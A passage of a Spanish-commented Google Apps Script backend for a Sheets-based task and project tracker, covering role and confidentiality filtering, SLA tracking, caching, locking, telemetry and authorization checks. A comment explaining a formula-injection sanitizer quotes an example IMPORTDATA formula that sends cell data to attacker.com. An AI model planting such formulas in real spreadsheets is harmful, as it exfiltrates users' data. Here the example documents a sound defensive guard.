  var firstNoteLine = '';
  if (t.notas) {
    var lines = t.notas.toString().split(/\r?\n/);
    firstNoteLine = (lines[0] || '').trim();
  }
  if (firstNoteLine) {
    t.accionable = firstNoteLine;
  } else {
    var byStatus = {
      'Pendiente':   'Por iniciar',
      'En curso':    'Avanzar',
      'En revisión': 'Revisar',
      'Bloqueado':   'Desbloquear',
      'Listo':       'Cerrada'
    };
    t.accionable = byStatus[t.status] || '';
  }

  // blockedReason: solo cuando la tarea está bloqueada
  t.blockedReason = (t.status === 'Bloqueado') ? firstNoteLine : '';

  // blockedDays: días (calendario) que lleva bloqueada — para que las On hold
  // no se pudran en silencio ahora que no cuentan como vencidas. null si no
  // está bloqueada o no hay sello (col 22 sin migrar / bloqueo pre-migración).
  t.blockedDays = null;
  if (t.status === 'Bloqueado' && t.blockedSince) {
    var _bMs = new Date(t.blockedSince).getTime();
    if (!isNaN(_bMs)) t.blockedDays = Math.max(0, Math.floor((Date.now() - _bMs) / 86400000));
  }

  // slaTarget por prioridad (derivado de la fuente unica SLA_LIMITS)
  t.slaTarget = (SLA_LIMITS[t.priority] || 5) + 'd';
}

// Diferencia de días entre dos fechas ISO (YYYY-MM-DD). Resultado en días enteros.
// Negativo si endISO está en el pasado relativo a startISO.
function _daysBetweenISO(startISO, endISO) {
  var s = _parseISODate(startISO);
  var e = _parseISODate(endISO);
  if (!s || !e) return 0;
  var ms = e.getTime() - s.getTime();
  return Math.round(ms / (1000 * 60 * 60 * 24));
}

// Parsea YYYY-MM-DD como fecha local (medianoche). Evita drift de timezone.
function _parseISODate(iso) {
  if (!iso) return null;
  var m = iso.toString().match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (!m) return null;
  return new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10));
}

// Convierte etaDays (int) en string humano editorial.
function _fmtEta(days) {
  if (days < 0) return 'venció hace ' + Math.abs(days) + 'd';
  if (days === 0) return 'vence HOY';
  if (days === 1) return 'mañana';
  return 'en ' + days + 'd';
}

// Genera la narrativa contextual server-side, en función del rol del visitante.
function _buildNarrative(data) {
  var role = data._role;
  var tasks = data.tasks || [];
  var active = tasks.filter(function(t){ return t.status !== 'Listo'; });
  var thisWeek = tasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays >= 0 && t.etaDays <= 7; });
  var atRisk = tasks.filter(function(t){ return (typeof t.etaDays === 'number' && t.etaDays < 0) || t.status === 'Bloqueado'; });

  if (role === 'specialist') {
    return 'Tienes ' + active.length + ' tareas activas. ' + thisWeek.length + ' vencen esta semana.';
  }
  if (role === 'manager') {
    return 'Tu equipo tiene ' + active.length + ' tareas activas. ' + atRisk.length + ' están en riesgo.';
  }
  // head / hq
  var countries = (data.countries || []).length;
  return 'LATAM tiene ' + active.length + ' tareas activas en ' + countries + ' países.';
}

// Cache solo la parte cara: lecturas del sheet. Los cálculos de stats se
// recalculan por rol (barato) porque filtramos por usuario.
// CacheService.put() tiene un límite duro de 100KB por key. Si lo superamos,
// el put() tira o falla silenciosamente y cada request lee del sheet directo
// → perf degrada sin aviso. Acá medimos el payload antes de cachear; si
// pasa 90KB loggeamos warning y skipeamos el cache (read directo). Cuando
// el piloto crezca y veamos este warning en logs, partir CACHE_KEY en
// (tracker_meta_v1 + tracker_tasks_v1) o reducir lo que serializamos.
var _CACHE_MAX_BYTES = 90 * 1024; // 90KB, margen de 10KB sobre el límite
function _cachedRawData() {
  try {
    var cached = CacheService.getScriptCache().get(CACHE_KEY);
    if (cached) return JSON.parse(cached);
  } catch(e) {}
  var raw = _buildRawData();
  try {
    var payload = JSON.stringify(raw);
    if (payload.length > _CACHE_MAX_BYTES) {
      Logger.log('⚠ _cachedRawData: payload ' + payload.length + 'B excede ' + _CACHE_MAX_BYTES + 'B — skip cache (perf degradará). Considerar partir CACHE_KEY.');
    } else {
      CacheService.getScriptCache().put(CACHE_KEY, payload, CACHE_TTL_SEC);
    }
  } catch(e) {}
  return raw;
}

// Lee del sheet todo lo que necesitamos para construir una vista, sin
// calcular stats. El caller filtra y calcula después.
function _buildRawData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var activeTasks = readTasks(ss.getSheetByName(SHEET_ACTIVO));
  var histTasks   = readTasks(ss.getSheetByName(SHEET_HISTORIAL));
  var config  = readConfig(ss);
  var equipos = readEquipos(ss);
  var projects = readProjects(ss);
  return {
    tasks: activeTasks,
    historial: histTasks,
    projects: projects,
    equipos: equipos,
    config: config,
    semana: activeTasks.length > 0 ? activeTasks[0].semana : getCurrentWeekLabel(),
    generated: Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy HH:mm')
  };
}

// ── ROLE-BASED FILTERING ─────────────────────────────────────────
// Determina el rol del visitante:
//   head       → email en config.Heads (csv, case-insensitive)
//   manager    → es líder de algún equipo (user.isLeader del allowlist)
//   specialist → resto
function determineRole(email, user, config) {
  var headsRaw = (config && config.Heads) ? config.Heads.toString() : '';
  var heads = headsRaw.toLowerCase().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
  if (heads.indexOf((email || '').toLowerCase()) >= 0) return 'head';
  if (user && user.isLeader) return 'manager';
  return 'specialist';
}

// Filtra tareas según el rol del usuario.
//   head      → todas
//   manager   → las de su país (pais === user.code, o resp en ese equipo)
//   specialist→ solo donde resp === user.name
// Después aplica un segundo filtro por confidencialidad de la tarea:
//   estandar     → visible para todo el equipo (rol OK actual)
//   restringido  → solo resp / lider / head / manager del país
//   confidencial → solo resp / lider / head
function filterTasksForRole(tasks, role, user, equipos) {
  // ¿el visitante es colaborador de la tarea (cualquier rol)? Da visibilidad.
  // task.colaboradores puede no existir en lecturas viejas → _isColaborador devuelve false.
  function _userIsColab(t) { return _isColaborador(t, user.name, null); }

  var roleFiltered;
  if (role === 'head') {
    roleFiltered = tasks;
  } else if (role === 'manager') {
    // Manager: tareas de su país (scope de país preservado — NO ve colaboraciones
    // de otros países). Una task de su país donde algún miembro es colaborador ya
    // entra por cc === user.code, así que el set de tareas visibles del manager no
    // cambia acá; el aporte real de "colaborador" para el manager está en el
    // override de confidencialidad de más abajo (ve una confidencial de SU país
    // si tiene un colaborador asignado, sin necesitar ser resp/lider).
    roleFiltered = tasks.filter(function(t) {
      var cc = t.pais || getCountryForMember(t.resp, equipos);
      return cc === user.code;
    });
  } else {
    // specialist: sus tareas (resp) + las tareas donde es colaborador (ver o editar).
    roleFiltered = tasks.filter(function(t){
      return t.resp === user.name || _userIsColab(t);
    });
  }

  // Filtro adicional por confidencialidad (server-side enforcement, no solo UI).
  // OVERRIDE: ser colaborador de la tarea da visibilidad incluso si es
  // restringida/confidencial — el filtro de confidencialidad NO debe ocultar una
  // tarea donde sos colaborador (es un acceso concedido explícitamente).
  return roleFiltered.filter(function(t) {
    if (_userIsColab(t)) return true;
    var conf = (t.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
    if (conf === 'estandar') return true;
    if (conf === 'restringido') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head'
          || (role === 'manager' && t.pais === user.code);
    }
    if (conf === 'confidencial') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head';
    }
    return true;
  });
}

// Filtra proyectos según el rol.
//   head      → todos
//   manager   → los de su país (pais === user.code)
//   specialist→ donde responsable === user.name o está en participantes
function filterProjectsForRole(projects, role, user) {
  if (role === 'head') return projects;
  if (role === 'manager') {
    return projects.filter(function(p){ return p.pais === user.code; });
  }
  return projects.filter(function(p) {
    if (p.responsable === user.name) return true;
    if (p.participantes && p.participantes.indexOf(user.name) >= 0) return true;
    return false;
  });
}

// Construye la vista completa (tasks filtradas, projects filtrados, stats
// recalculadas, KPIs, SLA, team grid, countries) para un rol+usuario dado.
function _buildViewForRole(raw, role, user, feriadosByCountry) {
  feriadosByCountry = feriadosByCountry || {};
  var equipos = raw.equipos;
  var allTasks = raw.tasks;
  var allHist  = raw.historial;
  var allProjects = raw.projects;

  var tasks = filterTasksForRole(allTasks, role, user, equipos);
  var historial = filterTasksForRole(allHist, role, user, equipos);
  var projects = filterProjectsForRole(allProjects, role, user);

  // Enrich cada proyecto con sus tareas visibles y stats derivadas.
  // IMPORTANTE: las stats (taskStats/pctDone/auto-status) se calculan sobre
  // TODAS las tareas del proyecto (raw.tasks/raw.historial, SIN filtro de
  // rol). Antes se calculaban sobre el subset visible: un specialist con 1
  // tarea de 5 veía "100% · Completado" al cerrar la suya, y cada rol veía
  // un % distinto del mismo proyecto. Solo son conteos agregados — no exponen
  // títulos ni contenido de tareas confidenciales. p.tasks (la lista) sí
  // queda filtrada por rol: la UI lista únicamente lo que el usuario puede ver.
  var projMap = {};
  projects.forEach(function(p) {
    p.tasks = [];
    p.taskStats = { total:0, pendiente:0, enCurso:0, enRevision:0, bloqueado:0, listo:0, alta:0, media:0, baja:0 };
    projMap[p.id] = p;
  });
  tasks.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    projMap[pid].tasks.push(t);
  });
  allTasks.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    var s = projMap[pid].taskStats;
    s.total++;
    if (t.status === 'Pendiente')    s.pendiente++;
    if (t.status === 'En curso')     s.enCurso++;
    if (t.status === 'En revisión')  s.enRevision++;
    if (t.status === 'Bloqueado')    s.bloqueado++;
    if (t.status === 'Listo')        s.listo++;
    if (t.priority === 'Alta')       s.alta++;
    if (t.priority === 'Media')      s.media++;
    if (t.priority === 'Baja')       s.baja++;
  });
  allHist.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    var s = projMap[pid].taskStats;
    s.total++; s.listo++;
  });
  // Auto-status de proyectos (misma lógica que antes)
  projects.forEach(function(p) {
    var s = p.taskStats;
    p.pctDone = s.total > 0 ? Math.round(s.listo / s.total * 100) : 0;
    if (p.status === 'Cancelado') return;
    if (s.total > 0 && s.listo === s.total) { p.status = 'Completado'; return; }
    if (p.statusForced) return;
    if (s.total === 0) return;
    if (s.bloqueado > 0 && s.enCurso === 0 && s.pendiente === 0 && s.enRevision === 0) p.status = 'En pausa';
    else p.status = 'Activo';
  });

  // KPIs globales sobre el subset visible
  var kpi = { total: tasks.length, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
  tasks.forEach(function(t) {
    if (t.priority === 'Alta')  kpi.alta++;
    if (t.priority === 'Media') kpi.media++;
    if (t.priority === 'Baja')  kpi.baja++;
    if (t.status === 'Pendiente')    kpi.pendiente++;
    if (t.status === 'En curso')     kpi.enCurso++;
    if (t.status === 'Bloqueado')    kpi.bloqueado++;
    if (t.status === 'En revisión')  kpi.enRevision++;
    if (t.status === 'Listo')        kpi.listo++;
  });

  // Per-person stats: construidas solo a partir de responsables visibles en tasks
  var teamMap = {};
  // Pre-poblar con TODOS los miembros del sheet Equipos. Antes el teamMap se
  // construia solo de quienes tenian tasks activas, asi que specialists sin
  // tareas no aparecian en el team — y data.team.find(name === me) retornaba
  // undefined → KPIs de "Mi desempeño" mostraban "—" incluso teniendo historial.
  equipos.forEach(function(eq) {
    (eq.members || []).forEach(function(memberName, i) {
      if (!memberName) return;
      if (!teamMap[memberName]) {
        teamMap[memberName] = { total:0, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
      }
    });
  });
  tasks.forEach(function(t) {
    if (!t.resp) return;
    if (!teamMap[t.resp]) teamMap[t.resp] = { total:0, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
    var p = teamMap[t.resp];
    p.total++;
    if (t.priority === 'Alta')  p.alta++;
    if (t.priority === 'Media') p.media++;
    if (t.priority === 'Baja')  p.baja++;
    if (t.status === 'Pendiente')    p.pendiente++;
    if (t.status === 'En curso')     p.enCurso++;
    if (t.status === 'Bloqueado')    p.bloqueado++;
    if (t.status === 'En revisión')  p.enRevision++;
    if (t.status === 'Listo')        p.listo++;
  });
  var team = Object.keys(teamMap).sort().map(function(name) {
    var m = teamMap[name];
    return {
      name: name,
      initials: name.split(' ').slice(0, 2).map(function(w){ return w[0]; }).join('').toUpperCase(),
      country: getCountryForMember(name, equipos),
      total: m.total, alta: m.alta, media: m.media, baja: m.baja,
      pendiente: m.pendiente, enCurso: m.enCurso, bloqueado: m.bloqueado,
      enRevision: m.enRevision, listo: m.listo,
      pctDone: m.total > 0 ? Math.round(m.listo / m.total * 100) : 0
    };
  });

  // Per-country stats: arrancamos pre-poblando con TODOS los equipos del
  // sheet Equipos (aunque no tengan tareas todavía), así HQ ve el país desde
  // el día uno sin esperar a que se creen tareas. Después las tareas suman
  // counts a los buckets ya inicializados.
  var countryMap = {};
  equipos.forEach(function(eq) {
    if (!eq || !eq.code) return;
    countryMap[eq.code] = {
      code: eq.code,
      name: eq.country || eq.code,
      leader: eq.leader || '',
      specialists: (eq.members || []).length,
      total: 0, alta: 0, media: 0, baja: 0
    };
  });
  tasks.forEach(function(t) {
    var cc = t.pais || getCountryForMember(t.resp, equipos);
    if (!cc) return;
    if (!countryMap[cc]) {
      // País con tareas pero sin entry en Equipos — agregamos placeholder.
      countryMap[cc] = { code: cc, name: cc, leader: '', specialists: 0, total: 0, alta: 0, media: 0, baja: 0 };
    }
    var c = countryMap[cc];
    c.total++;
    if (t.priority === 'Alta')  c.alta++;
    if (t.priority === 'Media') c.media++;
    if (t.priority === 'Baja')  c.baja++;
  });

  // SLA — días hábiles desde creación, restando feriados del país de la tarea.
  // Además del agregado, dejamos t.slaState ('onTime'|'atRisk'|'overdue') en
  // cada tarea: el cliente lo usa (taskOverdueBySLA) en vez de recomputar
  // días hábiles sin feriados, que sobre-contaba vencidas.
  var now = new Date();
  var sla = { onTime: 0, atRisk: 0, overdue: 0 };
  tasks.forEach(function(t) {
    if (t.status === 'Listo') return;
    // On hold = el reloj de SLA se pausa: una tarea esperando algo externo no
    // penaliza el cumplimiento del equipo. Queda fuera del denominador y con
    // slaState propio ('onhold') — el cliente no la cuenta como overdue.
    if (t.status === 'Bloqueado') { t.slaState = 'onhold'; return; }
    if (!t.creadoRaw) { sla.onTime++; t.slaState = 'onTime'; return; }
    var ferSet = feriadosByCountry[(t.pais || '').toUpperCase()] || null;
    var bizDays = countBizDays(new Date(t.creadoRaw), now, ferSet);
    var limit = SLA_LIMITS[t.priority] || 5;
    if (bizDays > limit) { sla.overdue++; t.slaState = 'overdue'; }
    else if (bizDays >= limit - 1) { sla.atRisk++; t.slaState = 'atRisk'; }
    else { sla.onTime++; t.slaState = 'onTime'; }
  });

  // Lista de proyectos para dropdowns (solo activos + en pausa)
  var projectList = projects
    .filter(function(p){ return p.status !== 'Completado' && p.status !== 'Cancelado'; })
    .map(function(p){ return { id: p.id, nombre: p.nombre }; });

  // Filtrar `equipos` según rol — un specialist o manager no debería ver miembros
  // y emails de otros países (PII / confidencialidad organizacional).
  var visibleEquipos = equipos;
  if (role === 'specialist' || role === 'manager') {
    visibleEquipos = equipos.filter(function(e){ return e.code === user.code; });
  }

  // HQ team es un equipo más (Global). Antes lo filtrábamos de `countries`
  // pero el feedback fue que debería ser seleccionable como cualquier otro
  // país en wizards/dropdowns. Ahora se incluye en countries; el frontend
  // decide cómo presentarlo (label "Global" en lugar del code HQ).
  var allCountriesArr = Object.values(countryMap);
  var hqTeam = allCountriesArr.find(function(c){ return (c.code || '').toUpperCase() === 'HQ'; }) || null;

  return {
    tasks: tasks,
    historial: historial,
    kpi: kpi,
    sla: sla,
    team: team,
    countries: allCountriesArr,
    hqTeam: hqTeam,
    equipos: visibleEquipos,
    // Roster names-only de TODOS los países (sin emails/PII) para el picker de
    // participantes/colaboradores multi-país (equipos completo, antes del recorte).
    rosterByCountry: equipos.map(function(eq){
      var mm = []; if (eq && eq.leader) mm.push(eq.leader);
      ((eq && eq.members) || []).forEach(function(m){ if (m) mm.push(m); });
      var seen = {}, uniq = []; mm.forEach(function(n){ if (!seen[n]) { seen[n] = 1; uniq.push(n); } });
      return { code: eq.code, country: eq.country || eq.code, members: uniq };
    }),
    projects: projects,
    projectList: projectList,
    semana: raw.semana,
    generated: raw.generated,
    config: raw.config,
    _role: role,
    _user: { name: user.name, code: user.code, isLeader: !!user.isLeader }
  };
}

// ════════════════════════════════════════════════════════════════
// WRITE AUTHORIZATION
// ════════════════════════════════════════════════════════════════
// Convierte throws en {success:false, error} para que el frontend reciba
// Previene formula injection en Sheets. Si un valor empieza con
// =, +, -, @, tab o CR, Sheets lo evalúa como fórmula. Ej: un usuario
// que escribe '=IMPORTDATA("https://attacker.com/?d="&A1)' como nombre
// de tarea exfiltra datos de la fila al renderearla. Mitigation:
// prefijar con apóstrofo ('), que Sheets trata como texto literal y
// no muestra. Aplicar a TODO valor que viene del cliente antes de
// setValue/appendRow. Es no-op para números, booleans, Date, null.
function _sanitizeCell(v) {
  if (v == null) return v;
  if (typeof v === 'number' || typeof v === 'boolean') return v;
  if (v instanceof Date) return v;
  var s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}
function _sanitizeRow(arr) {
  return arr.map(_sanitizeCell);
}

// siempre el mismo contrato (failureHandler deja la UI en estado raro).
// Además sirve como punto único de:
//   1) Serialización vía LockService.getDocumentLock() (30s), para que ninguna
//      mutación concurrente colisione con otra entry-point.
//   2) Invalidación de cache: en el finally se llama a invalidateCache() una
//      sola vez, así los _*Impl no necesitan invocarlo manualmente (evita
//      doble-invalidación y olvidos). Si añadís un nuevo entry-point que
//      muta, wrappealo acá; no metas invalidateCache() en el _*Impl.
//
// ── DOBLE LOCK (Document + Script) ─────────────────────────────
// Algunos _*Impl (addTask, addProject, updateTaskFields, etc) toman
// también un LockService.getScriptLock() interno. Es intencional:
//   - DocumentLock: serializa a nivel del Sheet (un solo writer del doc
//     a la vez, cross-entry-point).
//   - ScriptLock interno: protege secciones read-then-write donde
//     necesitamos lock más granular (ej: leer nextTaskId, calcular,
//     escribir — sin que otro proceso del MISMO script meta su nextTaskId
//     en el medio). Son locks DISTINTOS (no hay deadlock).
// Si te parece redundante: probablemente lo es para mutations atómicas
// de un solo setValue. NO lo quites de las que hacen read-then-write
// sin auditar primero. La redundancia es barata (~5ms), el race es caro.
// Códigos de error consumidos por _friendlyError() en el frontend para mostrar
// copy accionable. Pasarlos es opcional; un return sin code todavía se renderiza
// con res.error crudo (back-compat). Vocabulario mínimo, expandible si hace
// falta: LOCK_BUSY, BACKEND_ERROR, SHEET_NOT_MIGRATED, PERM_DENIED, NOT_FOUND,
// VALIDATION, STATE_CONFLICT.
function _err(code, msg) { return { success: false, error: msg, code: code }; }

function _safeMutation(fn) {
  var lock = LockService.getDocumentLock();
  try {
    lock.waitLock(30000);
  } catch (e) {
    return _err('LOCK_BUSY', 'Servidor ocupado, reintenta en un momento.');
  }
  try {
    return fn();
  } catch (e) {
    return _err('BACKEND_ERROR', (e && e.message) || String(e));
  } finally {
    try { lock.releaseLock(); } catch (e) {}
    invalidateCache();
  }
}

// ── TELEMETRY ───────────────────────────────────────────────────
// Wrapper mínimo para entry-points públicos. Loggea email del visitante,
// nombre de la función, duración (ms), success/error y meta opcional.
// Dos sinks: console.info (Stackdriver / Apps Script Executions) y la hoja
// 'Telemetry' del spreadsheet (si existe). Re-lanza el error original para
// no alterar el comportamiento del entry-point.
function _telemetry(fnName, fn, meta) {
  var start = Date.now();
  var email = '';
  try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
  var result, err;
  try {
    result = fn();
  } catch (e) {
    err = e;
  }
  var duration = Date.now() - start;
  var success = !err && (result == null || result.success !== false);
  var record = {
    ts: new Date().toISOString(),
    email: email,
    fn: fnName,
    duration: duration,
    success: success,
    error: err ? (err.message || String(err)) : (result && result.error) || null,
    meta: meta || null
  };
  // 1) Stackdriver vía console.info (se ve en Apps Script Executions / GCP Logging)
  try { console.info(JSON.stringify(record)); } catch (e) {}
  // 2) Hoja Telemetry (si existe). NO crearla automáticamente; el dueño la crea cuando quiera.
  try { _appendTelemetryRow(record); } catch (e) {}
  if (err) throw err;
  return result;
}

// Cómo activar: el dueño del sheet crea una hoja llamada 'Telemetry' con
// columnas: ts | email | fn | duration_ms | status | error | meta.
// Sin la hoja, el log queda solo en Stackdriver (console.info).
function _appendTelemetryRow(record) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var ws = ss.getSheetByName('Telemetry');
  if (!ws) return; // hoja no existe → skip silencioso (no error)
  ws.appendRow([
    record.ts, record.email, record.fn, record.duration,
    record.success ? 'OK' : 'ERR',
    record.error || '', record.meta ? JSON.stringify(record.meta) : ''
  ]);
}

// Contexto actual del visitante + su rol. Se usa en cada mutation.
function _getAuthContext() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  return { email: auth.email, user: auth.user, role: role, equipos: equipos, ss: ss, config: config };
}

// Valida que el visitante pueda modificar una tarea específica.
// target = {resp, pais} (al menos estos campos). Lanza si no puede.
function _authorizeTaskWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    var cc = (target && target.pais) || (target ? getCountryForMember(target.resp, ctx.equipos) : '');
    if (cc && cc !== ctx.user.code) {
      throw new Error('Sin permiso: tarea de otro país (' + cc + ')');
    }
    return;
  }
  // specialist: sus propias tareas (resp), o tareas donde es colaborador con rol
  // 'editar' (edita/avanza/cierra). Colaborador 'ver' NO pasa por acá (solo lee/comenta).
  var isOwnerSpec = target && _normalizeName(target.resp) === _normalizeName(ctx.user.name);
  var isEditorColab = _isColaborador(target, ctx.user.name, 'editar');
  if (!isOwnerSpec && !isEditorColab) {
    throw new Error('Sin permiso: solo puedes modificar tus tareas');
  }
  // ...y solo de su propio país (cierra el create cross-country vía API directa).
  // El guard de país solo aplica al dueño (un colaborador-editar puede vivir en otro
  // país y aun así trabajar la tarea que le compartieron).
  if (isOwnerSpec && !isEditorColab && target.pais && ctx.user.code && target.pais !== ctx.user.code) {
    throw new Error('Sin permiso: solo puedes crear tareas de tu país');
  }
}

// Valida que el visitante pueda modificar un proyecto específico.
// target = {responsable, pais, participantes}
function _authorizeProjectWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    if (target && target.pais && target.pais !== ctx.user.code) {
      throw new Error('Sin permiso: proyecto de otro país (' + target.pais + ')');
    }
    return;
  }
  // specialist: responsable o participante
  if (!target) throw new Error('Sin permiso');
  if (target.responsable === ctx.user.name) return;
  if (target.participantes && target.participantes.indexOf(ctx.user.name) >= 0) return;
  throw new Error('Sin permiso: solo puedes modificar proyectos donde participas');
}

// Lee el estado actual de una tarea desde el sheet (para validar antes de escribir).
function _readTaskById(ss, taskId) {
  var ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return null;
  var data = ws.getRange(4, 1, lr - 3, Math.min(ws.getLastColumn(), TASK_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == taskId) {
      // Devolvemos también status + campos editables. Antes solo row/resp/pais,
      // lo que dejaba current.status === undefined: (a) los auto-promote a
      // "En curso" (al comentar/editar una tarea Pendiente) NUNCA disparaban, y
      // (b) el activity log registraba old_value vacío. Esto los revive.
      return {
        row: i + 4,
        resp: data[i][2],
        pais: (data[i][12] || '').toString().trim(),
        status: (data[i][6] || '').toString().trim(),
        nombre: data[i][1],
        acc: data[i][3],
        deadline: data[i][4],
        priority: (data[i][5] || '').toString().trim(),
        notas: data[i][10],
        proyecto: data[i][11],
        proyectoId: data[i][11],
        lider: data[i][13],
        tipoTrabajo: data[i][14],
        riesgo: data[i][15],
        confidencialidad: (data[i][17] || '').toString().trim(),
        contraparte: data[i][18],
        areaSolicitante: (data[i][19] || '').toString().trim(),
        // Col 21 (índice 20): colaboradores. Default [] si la hoja no tiene la col.
        // _authorizeTaskWrite lo usa para permitir a colaboradores-editar.
        colaboradores: _parseColaboradores(data[i][20])
      };
    }
  }
  return null;
}

function _readProjectById(ss, projId) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return null;
  var lr = ws.getLastRow();
  if (lr < 2) return null;
  var data = ws.getRange(2, 1, lr - 1, Math.min(ws.getLastColumn(), PROJ_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == projId) {
      return {
        row: i + 2,
        pais: (data[i][2] || '').toString().trim(),
        responsable: (data[i][4] || '').toString().trim(),
        participantes: (data[i][12] || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean)
      };
    }
  }
  return null;
}

// ════════════════════════════════════════════════════════════════
// PROJECTS CRUD
// ════════════════════════════════════════════════════════════════
// Normaliza el deadline de un proyecto (la celda puede venir como Date, como
// ISO 'yyyy-MM-dd' o como 'dd/MM/yyyy') a sus dos formas: iso (para cálculos
// de días/SLA en el front) y disp 'dd/MM/yyyy' (para mostrar). Devuelve
// {iso:'', disp:''} si no hay deadline. Single source of truth para que el
// countdown del proyecto no dependa del formato con que quedó guardada.
function _deadlineParts(val) {
  if (!val) return { iso: '', disp: '' };
  if (val instanceof Date) {
    return {
      iso:  Utilities.formatDate(val, 'America/Bogota', 'yyyy-MM-dd'),
      disp: Utilities.formatDate(val, 'America/Bogota', 'dd/MM/yyyy')
    };
  }
  var s = val.toString().trim();
  var mi = s.match(/^(\d{4})-(\d{2})-(\d{2})/);   // ISO yyyy-MM-dd
  if (mi) return { iso: mi[1] + '-' + mi[2] + '-' + mi[3], disp: mi[3] + '/' + mi[2] + '/' + mi[1] };
  var md = s.match(/^(\d{2})\/(\d{2})\/(\d{4})/);  // dd/MM/yyyy
  if (md) return { iso: md[3] + '-' + md[2] + '-' + md[1], disp: md[1] + '/' + md[2] + '/' + md[3] };
  return { iso: '', disp: s };
}

// Convierte un deadline ISO 'yyyy-MM-dd' a un Date real (mediodía local, para
// evitar corrimientos por timezone al escribir en la hoja). Si ya es Date o no
// parsea, devuelve el valor tal cual para no romper el append/update.
function _deadlineToCell(val) {
  if (!val) return '';
  if (val instanceof Date) return val;
  var m = val.toString().trim().match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (m) return new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10), 12, 0, 0);
  return val;
}

function readProjects(ss) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return [];
  var lastRow = ws.getLastRow();
  if (lastRow < 2) return [];
  var lastCol = Math.min(ws.getLastColumn(), PROJ_COLS);
  var data = ws.getRange(2, 1, lastRow - 1, lastCol).getValues();
  var projects = [];
  data.forEach(function(row) {
    if (!row[1]) return;
    var _dl = _deadlineParts(row[5]);
    projects.push({
      id: row[0], nombre: row[1]||'', pais: (row[2]||'').toString().trim(),
      lider: (row[3]||'').toString().trim(), responsable: (row[4]||'').toString().trim(),
      deadline: _dl.disp,
      deadlineISO: _dl.iso, priority: row[6]||'Media',
      status: row[7]||'Activo',
      // Cualquier estado distinto del default 'Activo' se considera puesto manualmente y se respeta.
      statusForced: (function(){ var s=(row[7]||'').toString().trim(); return s!=='' && s!=='Activo'; })(),
      descripcion: row[8]||'', notas: row[9]||'',
      creado: row[10]? Utilities.formatDate(new Date(row[10]),'America/Bogota','dd/MM/yyyy'):'',
      semana: row[11]||'',
      participantes: (row[12]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),
      tipoTrabajo: (row[13]||'').toString().trim(),
      riesgo: (row[14]||'').toString().trim(),
      documentos: _parseDocs(row[15]),
      // Col 17 (índice 16): comma-separated. Si la columna aún no existe en la hoja, default [].
      contrapartesConflicto: (row[16] || '').toString().split(',').map(function(s){return s.trim();}).filter(Boolean),
      pctDone: 0, tasks: [], taskStats: {}
    });
  });
  return projects;
}

function addProject(obj) { return _safeMutation(function() { return _addProjectImpl(obj); }); }
function _addProjectImpl(obj) {
  var ctx = _getAuthContext();
  // El creador siempre queda como participante: así puede ver/editar el proyecto,
  // y un specialist puede crearlo (la autorización pide ser responsable o participante).
  var parts = (obj.participantes || '').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
  if (ctx.user && ctx.user.name && parts.indexOf(ctx.user.name) < 0) parts.push(ctx.user.name);
  // Validar que pueda crear en este país / como este responsable
  _authorizeProjectWrite(ctx, {
    pais: obj.pais || '',
    responsable: obj.responsable || ctx.user.name,
    participantes: parts
  });

  // Paridad con addTask: validar enums, rechazar deadline en el pasado y cerrar
  // el create cross-country del specialist (que _authorizeProjectWrite no cubre).
  var VALID_PRIO_P   = { 'Alta': 1, 'Media': 1, 'Baja': 1 };
  var VALID_STATUS_P = { 'Activo': 1, 'En pausa': 1, 'Completado': 1, 'Cancelado': 1 };
  if (obj.priority && !VALID_PRIO_P[obj.priority]) obj.priority = 'Media';
  if (obj.status && !VALID_STATUS_P[obj.status]) obj.status = 'Activo';
  if (ctx.role === 'specialist' && obj.pais && ctx.user.code && obj.pais !== ctx.user.code) {
    return { success: false, error: 'Solo podés crear proyectos de tu país.' };
  }
  if (obj.deadline) {
    var _dlRaw = String(obj.deadline).trim();
    var _dlm = _dlRaw.match(/^(\d{4})-(\d{2})-(\d{2})/);
    if (_dlm) {
      var _dlDate = new Date(parseInt(_dlm[1], 10), parseInt(_dlm[2], 10) - 1, parseInt(_dlm[3], 10));
      var _todayBog = new Date(Utilities.formatDate(new Date(), 'America/Bogota', 'yyyy/MM/dd'));
      if (_dlDate < _todayBog) return { success: false, error: 'El plazo no puede estar en el pasado.' };
    }
  }
  var ss = ctx.ss;
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) {
